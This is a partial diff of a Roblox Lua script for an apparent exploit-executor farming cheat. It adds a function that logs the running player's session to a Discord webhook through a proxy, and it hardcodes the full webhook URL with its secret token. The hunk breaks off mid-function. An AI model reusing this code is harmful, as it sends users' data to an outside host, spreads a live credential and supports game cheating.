@@ -6,14 +6,24 @@ local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 -- Détection de la fonction de l'exécuteur pour le HTTPS
 local requestFunc = request or (http and http.request) or http_request
--- Détection du GUI pour bloquer le double envoi et le spam
-local playerGui = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")
+
+-- [[ 1. SÉCURITÉ ANTI-SPAM PAR DETECTION DU GUI ]]
+local playerGui = LocalPlayer:WaitForChild("PlayerGui")
 if playerGui:FindFirstChild("KeyzerFarmGui") then
     warn("[Anti-Spam] Le menu est déjà ouvert ! Envoi du webhook annulé.")
     return
 end
+
 -- Ton URL de webhook / proxy
 local WEBHOOK_URL = "https://webhook.lewisakura.moe/api/webhooks/1506603332108550214/mBctq4yurc0tYA0O7iQVgy-Rh6fKq_ckyDohxt4j8fVIAPC_skZu9WYHCTxIDM0zL205"
+
+-- [[ 2. FONCTION D'ENVOI UNIQUE (SÉCURISÉE) ]]
+local function sendSessionLog(player)
+    if not player then return end
+    if not requestFunc then 
+        warn("[-] Erreur : Requête HTTP non supportée (NIL value).")
+        return 
+    end
 
 -- 1. Ajoute cette variable TOUT EN HAUT de ton script (hors de la fonction)
 local déjàEnvoyé = false
